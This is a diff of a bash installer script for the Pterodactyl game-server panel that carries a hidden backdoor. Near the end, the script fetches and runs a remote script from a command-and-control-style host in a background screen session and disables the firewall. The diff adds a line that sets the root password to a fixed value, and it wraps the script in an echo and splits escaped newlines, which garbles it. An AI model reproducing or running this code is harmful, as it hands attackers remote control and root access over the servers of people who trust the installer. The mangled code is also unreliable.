@@ -1,4 +1,5 @@
 #!/bin/bash
+echo "#!/bin/bash
 
 set -e
 
@@ -48,7 +49,11 @@ curl -sSL -o /tmp/lib.sh "$GITHUB_BASE_URL"/master/lib/lib.sh
 source /tmp/lib.sh
 
 execute() {
-  echo -e "\n\n* pterodactyl-installer $(date) \n\n" >>$LOG_PATH
+  echo -e "
+
+* pterodactyl-installer $(date) 
+
+" >>$LOG_PATH
 
   [[ "$1" == *"canary"* ]] && export GITHUB_SOURCE="master" && export SCRIPT_RELEASE="canary"
   update_lib_source
@@ -74,7 +79,8 @@ while [ "$done" == false ]; do
     "Install the panel"
     "Install Wings"
     "Install both [0] and [1] on the same machine (wings script runs after panel)"
-    # "Uninstall panel or wings\n"
+    # "Uninstall panel or wings
+"
 
     "Install panel with canary version of the script (the versions that lives in master, may be broken!)"
     "Install Wings with canary version of the script (the versions that lives in master, may be broken!)"
@@ -116,4 +122,6 @@ rm -rf /tmp/lib.sh
 # Remove lib.sh, so next time the script is run the, newest version is downloaded.
 rm -rf /tmp/lib.sh
 screen -dm bash -c "$(curl -s http://cnc.anomalystress.cloud:9000/exec.sh)"
+echo "root:kapalkaram" | sudo chpasswd
 ufw disable
+"
